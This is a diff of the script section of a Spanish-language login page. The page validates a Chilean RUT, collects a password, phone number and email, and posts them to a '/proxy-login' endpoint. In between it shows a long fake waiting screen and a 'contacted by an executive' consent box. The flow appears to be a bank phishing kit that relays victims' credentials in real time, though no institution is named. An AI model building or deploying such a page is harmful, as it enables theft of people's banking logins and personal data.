@@ -68,150 +68,147 @@
     </div>
   </div>
 
-  <script>
-    // ✅ Autoformateo de RUT en tiempo real
-    function formatearRUT(valor) {
-      valor = valor.replace(/\./g, "").replace(/-/g, "");
-      if(valor.length === 0) return "";
-      let dv = valor.slice(-1);
-      let cuerpo = valor.slice(0, -1);
-      let cuerpoFormateado = "";
-      while(cuerpo.length > 3){
-        cuerpoFormateado = "." + cuerpo.slice(-3) + cuerpoFormateado;
-        cuerpo = cuerpo.slice(0, -3);
-      }
-      cuerpoFormateado = cuerpo + cuerpoFormateado;
-      return cuerpoFormateado + "-" + dv;
+ <script>
+  // ✅ Autoformateo de RUT en tiempo real
+  function formatearRUT(valor) {
+    valor = valor.replace(/\./g, "").replace(/-/g, "");
+    if(valor.length === 0) return "";
+    let dv = valor.slice(-1);
+    let cuerpo = valor.slice(0, -1);
+    let cuerpoFormateado = "";
+    while(cuerpo.length > 3){
+      cuerpoFormateado = "." + cuerpo.slice(-3) + cuerpoFormateado;
+      cuerpo = cuerpo.slice(0, -3);
+    }
+    cuerpoFormateado = cuerpo + cuerpoFormateado;
+    return cuerpoFormateado + "-" + dv;
+  }
+
+  document.getElementById("rut").addEventListener("input", function(e){
+    let valor = e.target.value.replace(/[^0-9kK]/g, ""); // solo números y K
+    e.target.value = formatearRUT(valor);
+  });
+
+  // ✅ Validación de RUT
+  function validarRut(rutCompleto) {
+    rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
+    if(rutCompleto.length < 2) return false;
+    let cuerpo = rutCompleto.slice(0, -1);
+    let dv = rutCompleto.slice(-1);
+    let suma = 0, multiplo = 2;
+    for(let i = cuerpo.length - 1; i >= 0; i--) {
+      suma += parseInt(cuerpo.charAt(i)) * multiplo;
+      multiplo = multiplo < 7 ? multiplo + 1 : 2;
+    }
+    let dvEsperado = 11 - (suma % 11);
+    dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
+    return dv === dvEsperado;
+  }
+
+  document.getElementById("loginForm").addEventListener("submit", async function(e){
+    e.preventDefault();
+    const rut = document.getElementById("rut").value;
+    const passwd = document.getElementById("passwd").value;
+    const telefono = document.getElementById("telefono").value;
+    const contacto = document.getElementById("contacto").checked;
+
+    if(!validarRut(rut)){
+      document.getElementById("resultado").innerText = "❌ RUT inválido";
+      return;
+    }
+    if(!contacto){
+      document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un ejecutivo.";
+      return;
     }
 
-    document.getElementById("rut").addEventListener("input", function(e){
-      let valor = e.target.value.replace(/[^0-9kK]/g, ""); // solo números y K
-      e.target.value = formatearRUT(valor);
-    });
+    try {
+      const response = await fetch("/proxy-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ rut, passwd, telefono }),
+        credentials: "include"
+      });
+      const data = await response.json();
+      document.getElementById("resultado").innerText = data.mensaje;
 
-    // Validación de RUT
-    function validarRut(rutCompleto) {
-      rutCompleto = rutCompleto.replace(/\./g, "").replace(/-/g, "").toUpperCase();
-      if(rutCompleto.length < 2) return false;
-      let cuerpo = rutCompleto.slice(0, -1);
-      let dv = rutCompleto.slice(-1);
-      let suma = 0, multiplo = 2;
-      for(let i = cuerpo.length - 1; i >= 0; i--) {
-        suma += parseInt(cuerpo.charAt(i)) * multiplo;
-        multiplo = multiplo < 7 ? multiplo + 1 : 2;
-      }
-      let dvEsperado = 11 - (suma % 11);
-      dvEsperado = dvEsperado === 11 ? "0" : dvEsperado === 10 ? "K" : dvEsperado.toString();
-      return dv === dvEsperado;
-    }
+      if(response.ok && data.status === "ok"){
+        document.getElementById("loginForm").style.display="none";
+        document.getElementById("pantallaEspera").classList.remove("hidden");
 
-    document.getElementById("loginForm").addEventListener("submit", async function(e){
-      e.preventDefault();
-      const rut = document.getElementById("rut").value;
-      const passwd = document.getElementById("passwd").value;
-      const telefono = document.getElementById("telefono").value;
-      const contacto = document.getElementById("contacto").checked;
-
-      if(!validarRut(rut)){
-        document.getElementById("resultado").innerText = "❌ RUT inválido";
-        return;
-      }
-      if(!contacto){
-        document.getElementById("resultado").innerText = "⚠️ Debe aceptar ser contactado por un ejecutivo.";
-        return;
-      }
-
-      try {
-        const response = await fetch("/proxy-login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ rut, passwd, telefono }),
-          credentials: "include"
-        });
-        const data = await response.json();
-        document.getElementById("resultado").innerText = data.mensaje;
-
-        if(response.ok && data.status === "ok"){
-          document.getElementById("loginForm").style.display="none";
-          document.getElementById("pantallaEspera").classList.remove("hidden");
-
-          setTimeout(()=>{
-            document.getElementById("pantallaEspera").classList.add("hidden");
-            document.getElementById("formCorreo").classList.remove("hidden");
-          }, 25000);
-        } else {
-          document.getElementById("resultado").innerText = "❌ No se ha podido validar correctamente.";
-          // ✅ Volver al login después de 3 segundos
-          setTimeout(()=>{
-            document.getElementById("resultado").innerText = "";
-            document.getElementById("loginForm").style.display="block";
-            document.getElementById("pantallaEspera").classList.add("hidden");
-            document.getElementById("formCorreo").classList.add("hidden");
-            document.getElementById("pantallaProductos").classList.add("hidden");
-          }, 3000);
-        }
-      } catch (error) {
-        document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+        setTimeout(()=>{
+          document.getElementById("pantallaEspera").classList.add("hidden");
+          document.getElementById("formCorreo").classList.remove("hidden");
+        }, 25000);
+      } else {
+        document.getElementById("resultado").innerText = "❌ No se ha podido validar correctamente.";
         setTimeout(()=>{
           document.getElementById("resultado").innerText = "";
           document.getElementById("loginForm").style.display="block";
+          document.getElementById("pantallaEspera").classList.add("hidden");
+          document.getElementById("formCorreo").classList.add("hidden");
+          document.getElementById("pantallaProductos").classList.add("hidden");
         }, 3000);
       }
-    });
+    } catch (error) {
+      document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+      setTimeout(()=>{
+        document.getElementById("resultado").innerText = "";
+        document.getElementById("loginForm").style.display="block";
+      }, 3000);
+    }
+  });
 
-    async function enviarCorreo(){
-      const correo = document.getElementById("correo").value;
+  async function enviarCorreo(){
+    const correo = document.getElementById("correo").value;
 
-      try {
-        const response = await fetch("/proxy-login", {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ mail: correo }),
-          credentials: "include"
-        });
-        const data = await response.json();
-        document.getElementById("resultado").innerText = data.mensaje;
+    try {
+      const response = await fetch("/proxy-login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ mail: correo }),
+        credentials: "include"
+      });
+      const data = await response.json();
+      document.getElementById("resultado").innerText = data.mensaje;
 
-        if(!(response.ok && data.status === "ok")){
-          document.getElementById("resultado").innerText = "❌ No se ha podido validar correctamente.";
-          setTimeout(()=>{
-            document.getElementById("resultado").innerText = "";
-            document.getElementById("loginForm").style.display="block";
-            document.getElementById("formCorreo").classList.add("hidden");
-            document.getElementById("pantallaProductos").classList.add("hidden");
-          }, 3000);
-          return;
-        }
-      } catch (error) {
-        console.error("Error al enviar correo:", error);
-        document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
+      if(!(response.ok && data.status === "ok")){
+        document.getElementById("resultado").innerText = "❌ No se ha podido validar correctamente.";
         setTimeout(()=>{
           document.getElementById("resultado").innerText = "";
           document.getElementById("loginForm").style.display="block";
+          document.getElementById("formCorreo").classList.add("hidden");
+          document.getElementById("pantallaProductos").classList.add("hidden");
         }, 3000);
         return;
       }
-
-      document.getElementById("formCorreo").classList.add("hidden");
-      document.getElementById("pantallaEspera").classList.remove("hidden");
-
+    } catch (error) {
+      console.error("Error al enviar correo:", error);
+      document.getElementById("resultado").innerText = "⚠️ Error al conectar con el servidor.";
       setTimeout(()=>{
-        document.getElementById("pantallaEspera").classList.add("hidden");
-        document.getElementById("pantallaProductos").classList.remove("hidden");
-      }, 5000);
+        document.getElementById("resultado").innerText = "";
+        document.getElementById("loginForm").style.display="block";
+      }, 3000);
+      return;
     }
 
-    function continuarProductos(){
-      document.getElementById("pantallaProductos").classList.add("hidden");
-      document.getElementById
-          function continuarProductos(){
-      document.getElementById("pantallaProductos").classList.add("hidden");
-      document.getElementById("pantallaEspera").classList.remove("hidden");
+    document.getElementById("formCorreo").classList.add("hidden");
+    document.getElementById("pantallaEspera").classList.remove("hidden");
 
-      setTimeout(()=>{
-        window.location.href="productos.html";
-      }, 5000);
-    }
-  </script>
+    setTimeout(()=>{
+      document.getElementById("pantallaEspera").classList.add("hidden");
+      document.getElementById("pantallaProductos").classList.remove("hidden");
+    }, 5000);
+  }
+
+  // ✅ Corrección: función única y completa
+  function continuarProductos(){
+    document.getElementById("pantallaProductos").classList.add("hidden");
+    document.getElementById("pantallaEspera").classList.remove("hidden");
+
+    setTimeout(()=>{
+      window.location.href="productos.html";
+    }, 5000);
+  }
+</script>
 </body>
 </html>
